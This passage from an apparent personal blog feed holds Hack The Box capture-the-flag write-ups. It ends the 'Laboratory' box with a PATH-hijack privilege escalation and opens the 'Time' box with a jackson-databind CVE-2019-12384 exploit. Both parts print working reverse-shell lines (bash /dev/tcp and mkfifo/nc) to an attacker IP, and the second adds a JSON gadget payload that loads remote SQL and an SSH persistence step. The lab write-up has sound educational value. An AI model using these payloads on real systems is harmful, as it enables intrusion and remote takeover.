&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa dexter@10.10.10.216
dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 40
drwxr-xr-x 6 dexter dexter 4096 Oct 22 08:42 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 3 root   root   4096 Jun 26  2020 ..
lrwxrwxrwx 1 root   root      9 Jul 17  2020 .bash_history -&amp;gt; /dev/null
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 dexter dexter  220 Feb 25  2020 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 dexter dexter 3771 Feb 25  2020 .bashrc
drwx------ 2 dexter dexter 4096 Jun 26  2020 .cache
drwx------ 2 dexter dexter 4096 Oct 22 08:14 .gnupg
drwxrwxr-x 3 dexter dexter 4096 Jun 26  2020 .local
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 dexter dexter  807 Feb 25  2020 .profile
drwx------ 2 dexter dexter 4096 Jun 26  2020 .ssh
&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt; 1 root   dexter   33 Feb 19 11:06 user.txt
dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;After running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; again, this time in the real machine, noticed that there’s an SUID file with permissions attributed to the user &lt;strong&gt;dexter&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /usr/local/bin/docker-security
&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root dexter 16720 Aug 28 14:52 /usr/local/bin/docker-security
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Executing this binary, I couldn’t see any output, as well as no information/help is shown when used parameters like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--version&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--help&lt;/code&gt;. Analyzing the binary further, noticed that it’s an ELF, which could be abused somehow using a path hijack or buffer overflow.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file /usr/local/bin/docker-security
/usr/local/bin/docker-security: setuid ELF 64-bit LSB shared object, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;d466f1fb0f54c0274e5d05974e81f19dc1e76602, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 3.2.0, not stripped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before using disassembly tools, inspected the files strings from the attacker machine (once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; wasn’t available in this box) and some entries called attention: two calls to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; to redefine docker directories permissions, but without specifying the full path to the binary, confirming the suspicion that &lt;strong&gt;it is vulnerable to path hijacking&lt;/strong&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings docker-security
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]

&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;A&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;A^A_
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;700 /usr/bin/docker
&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;660 /var/run/docker.sock
&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;3&lt;span class=&quot;s2&quot;&gt;$&quot;
GCC: (Debian 10.1.0-6) 10.1.0

[...]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;path-hijack&quot;&gt;Path hijack&lt;/h3&gt;

&lt;p&gt;To get &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; privileges, the first step is to create a fake &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt;, in this case to return a reverse shel to the attacker machine. After that we need to modify user’s PATH variable so we can call our own chmod file instead of the one previously installed. The steps below achieve the tasks mentioned:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'#!/bin/bash'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /dev/shm/chmod
dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/4443 0&amp;gt;&amp;amp;1'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /dev/shm/chmod
dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /dev/shm/chmod
dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/dev/shm:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
dexter@laboratory:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After starting the listener in the port defined in the fake chmod binary (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 4443&lt;/code&gt;), executed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker-security&lt;/code&gt; which gave us the very expected root access, allowing us to read the root flag.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 4443                                                                                             
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.10] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.216] 44754
root@laboratory:~# &lt;span class=&quot;nb&quot;&gt;id  
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dexter&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
root@laboratory:~# &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I hope you guys have enjoyed this box resolution.&lt;/p&gt;

&lt;p&gt;See you in the next post soon! :smiley:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Writeup" /><category term="HackTheBox" /><category term="htb-easy" /><category term="htb-linux" /><summary type="html">Hello everyone! The machine of this week wil be Laboratory, another Linux box easy rated from Hack The Box, created by 0xc45.</summary></entry><entry><title type="html">Hackthebox write-up: Time</title><link href="https://davicruz.com/writeup/2021/04/htb-time/" rel="alternate" type="text/html" title="Hackthebox write-up: Time" /><published>2021-04-03T13:00:00-03:00</published><updated>2021-04-03T13:00:00-03:00</updated><id>https://davicruz.com/writeup/2021/04/htb-time</id><content type="html" xml:base="https://davicruz.com/writeup/2021/04/htb-time/">&lt;p&gt;Hello everyone!&lt;/p&gt;

&lt;p&gt;The machine of this week will be &lt;strong&gt;Time&lt;/strong&gt;, another Linux box medium rated from &lt;a href=&quot;https://www.hackthebox.eu&quot;&gt;Hack The Box&lt;/a&gt;, created by &lt;a href=&quot;https://app.hackthebox.eu/users/94858&quot;&gt;
egotisticalSW&lt;/a&gt; and &lt;a href=&quot;https://app.hackthebox.eu/users/27390&quot;&gt;felamos&lt;/a&gt;.&lt;!--more--&gt;&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:information_source: &lt;strong&gt;Info&lt;/strong&gt;: Write-ups for Hack the Box are always posted as soon as machines get retired.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/UViaunV.png&quot; alt=&quot;HTB Time&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;p&gt;We start with the enumeration of published services using a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; quick scan, where we can see the output below:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; quick 10.10.10.214
Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;will be slower.
Starting Nmap 7.91 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-02-26 16:08 &lt;span class=&quot;nt&quot;&gt;-03&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.214
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.077s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.41 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.41 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Online JSON parser
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;10.70 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;80tcp---http-service&quot;&gt;80/TCP - HTTP Service&lt;/h3&gt;

&lt;p&gt;Starting by checking the HTTP service published on port 80, noticed that we have a JSON Validation and Beautifier service.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/KWUpOXL.png&quot; alt=&quot;Online JSON Parser - Time&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After some enumeration with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whatweb&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nikto&lt;/code&gt; I haven’t found anything useful, so I proceeded to app experimentation, looking for some vulnerability that could lead us to some code injection or LFI.&lt;/p&gt;

&lt;p&gt;Analyzing the application, we have two functionalities: &lt;strong&gt;Beautify&lt;/strong&gt; and &lt;strong&gt;Validate&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The option beautify, after receiving a valid JSON, formats it in a pretty manner and, sending an invalid content (e.g. “test”), returns a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;null&lt;/code&gt; value.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/gwqqcNt.png&quot; alt=&quot;Online JSON Parser - Time - beautify&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;The Validate option (in beta) checks the syntax of the JSON provided. When we send an invalid request (e.g. “test”), the exception below is returned.&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'test': was expecting 'null', 'true', 'false' or NaN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h2&gt;

&lt;p&gt;After searching for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.fasterxml.jackson.core&lt;/code&gt; I have found about &lt;strong&gt;Jackson&lt;/strong&gt; project, developed by &lt;strong&gt;FasterXML&lt;/strong&gt; and from which core is the base component for &lt;a href=&quot;https://github.com/FasterXML/jackson-databind&quot;&gt;jackson-databind&lt;/a&gt;, a popular JSON library, here used to implement the formatting and validating features.&lt;/p&gt;

&lt;p&gt;Looking for CVEs on jackson-databind, I have found the following for code execution published in 2019, according to the page &lt;a href=&quot;https://www.cvedetails.com&quot;&gt;CVE Details&lt;/a&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ju87o1J.png&quot; alt=&quot;CVE Details&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Of the 4 listed, I have found for &lt;strong&gt;CVE-2019-12384&lt;/strong&gt; a working PoC at &lt;a href=&quot;https://blog.doyensec.com/2019/07/22/jackson-gadgets.html&quot;&gt;this blog&lt;/a&gt;, which I have used to gain initial access to the box. The following steps were used to get a reverse shell:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Created a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inject.sql&lt;/code&gt; with the code below, modified from the version at the blog, to start a reverse shell to the attacker machine at 4443 and published using a python3 HTTP server (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo python3 -m http.server 80&lt;/code&gt;) from the directory where the file resides.&lt;/p&gt;

    &lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ALIAS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHELLEXEC&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AS&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellexec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IOException&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scanner&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Scanner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getInputStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;useDelimiter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;A&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasNext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;CALL&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SHELLEXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.10.10 4443 &amp;gt;/tmp/f'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;Configured listener using netcat by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 4443&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Sent payload below in the application instead of a JSON content to be validated.&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, {&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.10.10/inject.sql'&quot;}]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/xsb87hN.png&quot; alt=&quot;Listener and Webserver - Time&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/SiAG5hB.png&quot; alt=&quot;Online Json Parser - Sending the payload&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User flag&lt;/h2&gt;

&lt;p&gt;After upgrading the shell, started enumeration where was identified that the user we were using, &lt;strong&gt;pericles&lt;/strong&gt;, was a regular Linux user with no special permissions granted.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pericles@time:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pericles&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pericles&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;pericles&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Acessing its root directory found the user flag, as below.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pericles@time:/var/www/html&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
pericles@time:/home/pericles&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt 
&amp;lt;redacted&amp;gt;
pericles@time:/home/pericles&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root flag&lt;/h2&gt;

&lt;p&gt;Before continuing enumeration, to make easier regaining access if needed, created a SSH key using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh-keygen&lt;/code&gt; and configured the public key in the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.ssh/authorized_keys&lt;/code&gt;, allowing us to directly connect to the user pericles via SSH.&lt;/p&gt;

&lt;p&gt;The enumeration was done by running &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; and one of the findings called attention, referring to the machine name: a shell file owned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pericles&lt;/code&gt; in the path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/timer_backup.sh&lt;/code&gt;.&lt;/p&gt;

